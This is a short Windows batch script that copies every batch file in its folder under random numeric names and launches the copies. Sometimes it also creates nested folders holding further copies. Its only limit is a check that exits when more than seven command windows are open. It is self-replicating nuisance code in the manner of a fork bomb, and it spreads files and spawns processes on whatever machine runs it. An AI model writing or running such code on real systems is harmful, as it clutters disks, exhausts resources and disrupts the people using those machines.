PING -n 5 127.0.0.1>nul

REM If CMD.exe count is over 10 kill all 
tasklist /fi "IMAGENAME eq cmd.exe" | find /i "cmd.exe" /c > temp
set /p VAR=<temp
if %VAR% GTR 7 (exit)
if %VAR% GTR 10 (taskkill /im cmd.exe)

SET /a i=(%random%*1000/32768)
SET /a i=(%random%*1000/32768)

copy *.bat %i%.bat
Start %i%.bat

if %i% GTR 500 (
    mkdir %i%%i%
    copy *.bat .\%i%%i%\%i%%i%.bat
    cd .\%i%%i%
    start %i%%i%.bat
)

exit

REM Searches active cmd.exe and outputs a sum for each of the counts.
REM tasklist /fi "IMAGENAME eq cmd.exe" | find /i "cmd.exe" /c